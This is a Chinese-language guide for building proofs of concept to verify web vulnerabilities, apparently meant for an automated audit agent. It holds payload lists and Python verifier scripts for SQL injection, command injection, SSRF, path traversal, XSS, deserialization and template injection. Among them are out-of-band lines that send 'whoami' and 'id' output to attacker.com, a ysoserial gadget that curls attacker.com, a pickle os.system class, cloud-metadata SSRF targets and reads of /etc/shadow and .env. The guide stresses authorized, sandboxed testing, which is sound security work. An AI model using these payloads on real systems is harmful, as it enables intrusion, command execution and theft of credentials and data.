# PoC Generation Guide

> PoC (Proof of Concept) 生成指南 - 借鉴 DeepAudit Verification Agent 的验证方法论
> 覆盖: 漏洞验证、PoC构造、安全测试、误报排除

---

## Overview

PoC 是漏洞验证的关键环节，一个有效的 PoC 能够：
1. **确认漏洞真实存在** - 排除误报
2. **展示实际危害** - 量化风险等级
3. **指导修复方向** - 明确防护措施
4. **支持安全报告** - 提供可复现证据

```
┌─────────────────────────────────────────────────────────────────┐
│                    PoC Generation Workflow                       │
│                                                                 │
│   发现漏洞 → 分析条件 → 构造Payload → 本地验证 → 记录证据       │
│                                                                 │
│   注意: 所有测试必须在授权环境中进行                              │
└─────────────────────────────────────────────────────────────────┘
```

---

## PoC 分类与模板

### 1. SQL 注入 PoC

#### 1.1 基于错误的注入 (Error-based)

```python
# PoC 模板: Error-based SQL Injection
# 目标: 通过错误信息确认注入点

# 测试向量
payloads = [
    "1'",                           # 单引号触发语法错误
    "1' OR '1'='1",                 # 布尔条件
    "1' AND 1=CONVERT(int,@@version)--",  # MSSQL版本提取
    "1' AND extractvalue(1,concat(0x7e,version()))--",  # MySQL报错注入
]

# 验证方法
def verify_error_sqli(url, param):
    """
    验证步骤:
    1. 发送正常请求，记录响应
    2. 发送带单引号的请求
    3. 对比响应差异，检查SQL错误信息
    """
    normal_response = requests.get(url, params={param: "1"})
    inject_response = requests.get(url, params={param: "1'"})

    # 检查SQL错误特征
    sql_errors = [
        "SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL",
        "SQLite", "ODBC", "Microsoft SQL", "syntax error"
    ]

    for error in sql_errors:
        if error.lower() in inject_response.text.lower():
            return True, f"Detected SQL error: {error}"

    return False, "No SQL error detected"
```

#### 1.2 基于时间的盲注 (Time-based Blind)

```python
# PoC 模板: Time-based Blind SQL Injection
# 目标: 通过响应时间差异确认注入

import time

payloads = {
    "mysql": "1' AND SLEEP(5)--",
    "mssql": "1'; WAITFOR DELAY '0:0:5'--",
    "postgres": "1'; SELECT pg_sleep(5)--",
    "oracle": "1' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--"
}

def verify_time_sqli(url, param, db_type="mysql", delay=5):
    """
    验证步骤:
    1. 发送正常请求，记录基准时间
    2. 发送延时payload
    3. 如果响应时间 >= delay，确认注入存在
    """
    # 基准测试
    start = time.time()
    requests.get(url, params={param: "1"})
    baseline = time.time() - start

    # 延时测试
    start = time.time()
    requests.get(url, params={param: payloads[db_type]})
    inject_time = time.time() - start

    # 判断: 响应时间显著增加
    if inject_time >= baseline + delay - 1:
        return True, f"Time delay detected: {inject_time:.2f}s (baseline: {baseline:.2f}s)"

    return False, "No time delay detected"
```

#### 1.3 UNION 注入数据提取

```sql
-- PoC 模板: UNION-based Data Extraction

-- Step 1: 确定列数
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  -- 直到报错，确定列数

-- Step 2: 确定回显位置
' UNION SELECT 1,2,3--
' UNION SELECT NULL,NULL,NULL--

-- Step 3: 提取数据
' UNION SELECT username,password,NULL FROM users--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--

-- 验证标准: 成功返回非当前查询的数据
```

---

### 2. 命令注入 PoC

#### 2.1 基于输出的命令注入

```python
# PoC 模板: Command Injection with Output
# 目标: 执行系统命令并获取输出

payloads = {
    "linux": [
        "; id",
        "| id",
        "$(id)",
        "`id`",
        "\n id",
        "& id",
        "|| id",
    ],
    "windows": [
        "& whoami",
        "| whoami",
        "; whoami",
        "\n whoami",
    ]
}

def verify_command_injection(url, param, os_type="linux"):
    """
    验证步骤:
    1. 发送命令注入payload
    2. 检查响应中是否包含命令输出特征
    """
    for payload in payloads[os_type]:
        response = requests.get(url, params={param: f"test{payload}"})

        # Linux特征: uid=xxx(username)
        if os_type == "linux" and "uid=" in response.text:
            return True, f"Command executed: {payload}"

        # Windows特征: DOMAIN\username
        if os_type == "windows" and "\\" in response.text:
            return True, f"Command executed: {payload}"

    return False, "No command output detected"
```

#### 2.2 基于时间的盲注入

```python
# PoC 模板: Blind Command Injection (Time-based)

payloads = {
    "linux": "; sleep 5",
    "windows": "& ping -n 5 127.0.0.1"
}

def verify_blind_command_injection(url, param, os_type="linux", delay=5):
    """
    验证步骤:
    1. 发送延时命令
    2. 检查响应时间是否显著增加
    """
    start = time.time()
    requests.get(url, params={param: f"test{payloads[os_type]}"})
    elapsed = time.time() - start

    if elapsed >= delay - 1:
        return True, f"Blind command injection confirmed: {elapsed:.2f}s delay"

    return False, "No time delay detected"
```

#### 2.3 带外数据提取 (OOB)

```python
# PoC 模板: Out-of-Band Command Injection
# 使用 DNS/HTTP 回调确认漏洞

# 需要: Burp Collaborator / 自建回调服务器

payloads = {
    "dns_linux": "; nslookup $(whoami).attacker.com",
    "dns_windows": "& nslookup %username%.attacker.com",
    "http_linux": "; curl http://attacker.com/$(id|base64)",
    "http_windows": "& powershell -c \"IWR http://attacker.com/$env:username\""
}

# 验证方法: 检查回调服务器是否收到请求
```

---

### 3. SSRF PoC

#### 3.1 内网探测

```python
# PoC 模板: SSRF Internal Network Probe

internal_targets = [
    "http://127.0.0.1:80",
    "http://localhost:8080",
    "http://192.168.1.1",
    "http://10.0.0.1",
    "http://172.16.0.1",
]

# 云环境 Metadata
cloud_metadata = {
    "aws": "http://169.254.169.254/latest/meta-data/",
    "gcp": "http://metadata.google.internal/computeMetadata/v1/",
    "azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "alibaba": "http://100.100.100.200/latest/meta-data/",
}

def verify_ssrf(url, param):
    """
    验证步骤:
    1. 尝试访问内网地址
    2. 检查响应是否包含内网服务特征
    """
    for target in internal_targets:
        response = requests.get(url, params={param: target})

        # 检查是否返回了内网服务内容
        if response.status_code == 200 and len(response.text) > 0:
            # 排除直接返回URL的情况
            if target not in response.text:
                return True, f"SSRF confirmed: accessed {target}"

    return False, "SSRF not confirmed"
```

#### 3.2 协议走私

```python
# PoC 模板: SSRF Protocol Smuggling

protocol_payloads = [
    "file:///etc/passwd",                    # 本地文件读取
    "dict://127.0.0.1:6379/info",           # Redis探测
    "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a",  # Gopher协议
    "ftp://127.0.0.1:21",                    # FTP服务探测
]

# URL解析绕过
bypass_payloads = [
    "http://127.0.0.1@evil.com",            # @ 绕过
    "http://evil.com#@127.0.0.1",           # # 绕过
    "http://127。0。0。1",                    # Unicode点
    "http://2130706433",                     # 十进制IP
    "http://0x7f000001",                     # 十六进制IP
    "http://127.1",                          # 短格式IP
    "http://[::1]",                          # IPv6 localhost
]
```

---

### 4. 路径遍历 PoC

```python
# PoC 模板: Path Traversal

traversal_payloads = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system.ini",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "..%252f..%252f..%252fetc/passwd",  # 双重编码
]

# 敏感文件列表
sensitive_files = {
    "linux": [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/proc/self/environ",
        "/proc/self/cmdline",
    ],
    "windows": [
        "C:\\Windows\\system.ini",
        "C:\\Windows\\win.ini",
        "C:\\boot.ini",
    ],
    "webapp": [
        "WEB-INF/web.xml",
        "application.properties",
        "application.yml",
        ".env",
    ]
}

def verify_path_traversal(url, param, os_type="linux"):
    """
    验证步骤:
    1. 尝试读取已知敏感文件
    2. 检查响应中是否包含文件内容特征
    """
    for payload in traversal_payloads:
        response = requests.get(url, params={param: payload})

        # Linux /etc/passwd 特征
        if os_type == "linux" and "root:" in response.text:
            return True, f"Path traversal confirmed: {payload}"

        # Windows system.ini 特征
        if os_type == "windows" and "[drivers]" in response.text.lower():
            return True, f"Path traversal confirmed: {payload}"

    return False, "Path traversal not confirmed"
```

---

### 5. XSS PoC

```python
# PoC 模板: Cross-Site Scripting

xss_payloads = {
    "basic": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
    ],
    "filter_bypass": [
        "<ScRiPt>alert(1)</ScRiPt>",          # 大小写混淆
        "<script>alert`1`</script>",           # 模板字符串
        "<img src=x onerror='alert(1)'>",     # 单引号
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ],
    "encoding": [
        "&lt;script&gt;alert(1)&lt;/script&gt;",  # HTML实体
        "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",  # Hex编码
    ]
}

def verify_xss(url, param, xss_type="basic"):
    """
    验证步骤:
    1. 发送XSS payload
    2. 检查响应中是否原样返回payload (未转义)
    """
    for payload in xss_payloads[xss_type]:
        response = requests.get(url, params={param: payload})

        # 检查payload是否被原样返回
        if payload in response.text:
            return True, f"Reflected XSS: {payload}"

        # 检查是否只是部分转义
        if "<script>" in response.text or "onerror=" in response.text:
            return True, f"Partial XSS: {payload}"

    return False, "XSS not confirmed"
```

---

### 6. 反序列化 PoC

#### 6.1 Java 反序列化

```java
// PoC 模板: Java Deserialization (使用 ysoserial)

// 生成 payload 命令:
// java -jar ysoserial.jar CommonsCollections6 "id" > payload.bin

// 常用 Gadget 链:
// CommonsCollections1-7 - Apache Commons Collections
// CommonsBeanutils1     - Apache Commons Beanutils
// Spring1-2             - Spring Framework
// Hibernate1-2          - Hibernate ORM
// Jdk7u21               - JDK 原生
// URLDNS                - DNS探测 (无害)

// 验证步骤:
// 1. 先用 URLDNS 确认反序列化点
// 2. 再用 RCE gadget 验证执行能力
```

```python
# Python 生成 URLDNS payload
import subprocess

def generate_ysoserial_payload(gadget, command):
    """生成 ysoserial payload"""
    result = subprocess.run(
        ["java", "-jar", "ysoserial.jar", gadget, command],
        capture_output=True
    )
    return result.stdout

# DNS探测 payload
dns_payload = generate_ysoserial_payload("URLDNS", "http://attacker.dnslog.cn")

# RCE payload
rce_payload = generate_ysoserial_payload("CommonsCollections6", "curl http://attacker.com/pwned")
```

#### 6.2 Python 反序列化

```python
# PoC 模板: Python Pickle Deserialization

import pickle
import base64

class RCE:
    def __reduce__(self):
        import os
        return (os.system, ("id",))

# 生成恶意 pickle
payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(f"Payload: {payload}")

# 验证方法: 发送到反序列化端点，检查命令执行
```

#### 6.3 PHP 反序列化

```php
<?php
// PoC 模板: PHP Deserialization

// 利用 __destruct 魔术方法
class Exploit {
    public $cmd;

    function __destruct() {
        system($this->cmd);
    }
}

$obj = new Exploit();
$obj->cmd = "id";
$payload = serialize($obj);
echo urlencode($payload);
// O:7:"Exploit":1:{s:3:"cmd";s:2:"id";}
?>
```

---

### 7. SSTI PoC

```python
# PoC 模板: Server-Side Template Injection

ssti_payloads = {
    "jinja2": [
        "{{7*7}}",                    # 基础检测
        "{{config}}",                 # 配置泄露
        "{{''.__class__.__mro__[1].__subclasses__()}}",  # 类探测
        "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",  # 文件读取
    ],
    "freemarker": [
        "${7*7}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    ],
    "velocity": [
        "#set($x=7*7)$x",
        "#set($rt=$x.class.forName('java.lang.Runtime').getRuntime())$rt.exec('id')",
    ],
    "thymeleaf": [
        "${7*7}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
    ],
    "twig": [
        "{{7*7}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    ],
}

def verify_ssti(url, param, engine="jinja2"):
    """
    验证步骤:
    1. 发送数学表达式 {{7*7}}
    2. 检查响应是否返回 49
    """
    response = requests.get(url, params={param: ssti_payloads[engine][0]})

    if "49" in response.text:
        return True, f"SSTI confirmed: {engine} template engine"

    return False, "SSTI not confirmed"
```

---

## PoC 验证最佳实践

### 验证原则

```
┌─────────────────────────────────────────────────────────────────┐
│  PoC 验证五原则                                                  │
│                                                                 │
│  1. 最小化原则 - 使用最简单的payload确认漏洞                      │
│  2. 无害化原则 - 避免造成实际损害 (如删除数据)                    │
│  3. 可重复原则 - 确保PoC可以稳定复现                             │
│  4. 记录原则   - 完整记录请求/响应/时间戳                         │
│  5. 授权原则   - 仅在授权范围内测试                               │
└─────────────────────────────────────────────────────────────────┘
```

### 安全的验证方法

| 漏洞类型 | 安全验证方法 | 避免的危险操作 |
|----------|--------------|----------------|
| SQL注入 | 使用 `SLEEP()` 或读取版本 | 避免 `DROP`/`DELETE` |
| 命令注入 | 使用 `id`/`whoami` | 避免 `rm`/`del` |
| SSRF | 访问 metadata 或探测端口 | 避免攻击内网服务 |
| 文件读取 | 读取 `/etc/passwd` 等系统文件 | 避免读取敏感业务数据 |
| XSS | 使用 `alert(1)` | 避免窃取真实Cookie |
| 反序列化 | 使用 URLDNS 探测 | 避免直接RCE |

### 验证结果记录模板

```markdown
## PoC 验证报告

### 基本信息
- 漏洞类型: [SQL注入/命令注入/SSRF/...]
- 目标URL: https://target.com/api/query
- 参数: id
- 验证时间: 2026-01-23 10:30:00

### 验证过程

**Step 1: 基础探测**
```
Request:
GET /api/query?id=1' HTTP/1.1
Host: target.com

Response:
HTTP/1.1 500 Internal Server Error
{"error": "SQL syntax error..."}
```

**Step 2: 确认注入**
```
Request:
GET /api/query?id=1' AND SLEEP(5)-- HTTP/1.1

Response:
(响应延迟 5.2 秒)
```

### 验证结论
- 状态: [已确认] / [需人工验证] / [误报]
- 置信度: [高] / [中] / [低]
- 影响评估: 可获取数据库完整内容

### 修复建议
使用参数化查询替代字符串拼接
```

---

## 本地验证环境

### 推荐工具

```bash
# HTTP 请求工具
curl              # 命令行 HTTP 客户端
httpie            # 更友好的 HTTP 客户端
burpsuite         # 专业渗透测试工具

# 漏洞利用工具
sqlmap            # SQL注入自动化
ysoserial         # Java反序列化payload生成
JNDI-Injection-Exploit  # JNDI注入利用

# 回调服务
Burp Collaborator # Burp内置回调服务
interactsh        # 开源回调服务
dnslog.cn         # DNS回调服务
```

### Docker 隔离环境

```yaml
# docker-compose.yml - 安全的PoC测试环境
version: '3'
services:
  poc-runner:
    image: python:3.11-slim
    volumes:
      - ./pocs:/app
    network_mode: "none"  # 禁用网络
    mem_limit: 512m
    cpus: 1.0
    read_only: true
    user: "1000:1000"
    working_dir: /app
    command: python poc.py
```

---

## 置信度评分

```
┌─────────────────────────────────────────────────────────────────┐
│  置信度评分标准                                                  │
│                                                                 │
│  [已确认] 100%  - PoC成功执行，获得预期结果                       │
│  [高置信] 80%+  - 明确的漏洞特征，但无法完全验证                  │
│  [中置信] 50%+  - 存在可疑模式，需要进一步分析                    │
│  [需验证] <50%  - 静态分析发现，尚未动态验证                      │
└─────────────────────────────────────────────────────────────────┘

评分因素:
+ 成功执行PoC并获得预期输出        (+50%)
+ 多次测试结果一致                 (+20%)
+ 使用多种payload均成功            (+15%)
+ 符合已知漏洞模式                 (+10%)
+ 存在WAF/过滤但可绕过             (+5%)

- 仅基于代码审计发现               (-30%)
- 需要特定前置条件                 (-20%)
- 响应不稳定                       (-15%)
- 可能存在安全机制                 (-10%)
```

---

## 参考资源

### 工具链接
- [sqlmap](https://github.com/sqlmapproject/sqlmap) - SQL注入工具
- [ysoserial](https://github.com/frohoff/ysoserial) - Java反序列化
- [JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit) - JNDI利用
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - Payload大全

### 学习资源
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTricks](https://book.hacktricks.xyz/)

---

**最后更新**: 2026-01-23
**版本**: 1.0.0
